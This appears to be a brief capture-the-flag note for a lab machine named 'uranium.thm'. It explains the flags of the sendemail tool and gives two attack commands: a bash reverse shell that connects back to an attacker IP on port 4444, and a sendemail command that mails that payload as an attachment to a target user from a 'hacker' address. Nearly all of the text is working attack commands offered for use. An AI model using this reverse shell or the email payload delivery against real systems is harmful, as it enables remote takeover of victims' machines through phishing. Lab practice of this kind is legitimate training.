# smtp
`-t`  is the target user email address, `-f` is your address, `-s` is mail server, `-u` is subject, `-m` is the message and -a is the local file/payload to attach

```text-plain
bash -c "bash -i >& /dev/tcp/10.17.17.11/4444 0>&1"
```

```text-plain
sendemail -t hakanbey@uranium.thm -f hacker@Iminyourcloud.com -s uranium.thm -u "Some other subject" -m "some ther message" -a application -o tls=no
```